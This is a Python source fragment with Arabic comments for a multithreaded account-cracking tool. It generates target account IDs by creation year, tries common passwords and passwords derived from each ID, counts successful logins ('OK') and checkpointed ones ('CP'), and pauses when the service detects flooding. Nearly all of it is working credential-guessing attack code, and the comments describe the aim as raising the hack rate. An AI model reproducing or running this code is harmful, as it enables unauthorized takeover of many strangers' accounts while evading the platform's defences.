class MohaTaskDistributor:
    def __init__(self, engine):
        self.engine = engine
        self.max_threads = 45
        self.retries = 3
        # قائمة كلمات السر الأكثر شيوعاً للحسابات القديمة 2009-2014
        self.base_passwords = [
            "123456", "1234567", "12345678", "123456789",
           
            
        ]

    def start_hunting(self, year_choice, total_limit):
        """ المحرك المسؤول عن توزيع الأيديات على الخيوط (Threads) """
        print(f"\n{C} [!] PREPARING {G}{total_limit} {W}TARGETS FOR {Y}{year_choice}...")
        print(f"{C} [!] SHIELD STATUS: {G}ACTIVE | {W}THREADS: {G}{self.max_threads}")
        print(W + " —"*30 + "\n")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for _ in range(total_limit):
                if self.engine.ban_detected:
                    break
                
                # توليد UID مستهدف بناءً على السنة
                target_uid = UIDGenerator.generate(year_choice)
                
                # توليد قائمة كلمات سر مخصصة لكل UID لزيادة نسبة الـ Hits
                custom_passes = self.generate_custom_passwords(target_uid)
                
                # إرسال المهمة للمحرك
                executor.submit(self.run_task, target_uid, custom_passes)

    def generate_custom_passwords(self, uid):
        """ توليد باسات ذكية مبنية على الأيدي لزيادة الاختراق """
        custom = []
        custom.extend(self.base_passwords)
        # إضافة باسات مشتقة من الرقم الأخير للأيدي (شائع في الحسابات القديمة)
        last_digits = uid[-6:]
        custom.append(last_digits)
        custom.append(uid[:6])
        return list(set(custom)) # إزالة التكرار

    def run_task(self, uid, passwords):
        """ تنفيذ الفحص لكل باورد مسجل للأيدي """
        for pwd in passwords:
            if self.engine.ban_detected: break
            
            result = self.engine.process_request(uid, pwd)
            
            if result == "OK" or result == "CP":
                break # إذا نجح أو دخل سيكيور ننتقل للأيدي التالي
            elif result == "BAN":
                print(f"\n{R} [!] SYSTEM DETECTED FLOODING. RELAXING...{RESET}")
                time.sleep(30) # تهدئة النظام تلقائياً عند استشعار الحظر
                break
            
        self.engine.loop += 1
        # تحديث العداد في سطر واحد (Dynamic Progress Bar)
        progress = (self.engine.loop / 10) # مجرد تمثيل للتقدم
        sys.stdout.write(f"\r {W}[SCANNING] {self.engine.loop} | {G}OK:{len(self.engine.ok)} | {Y}CP:{len(self.engine.cp)}{RESET}")
        sys.stdout.flush()

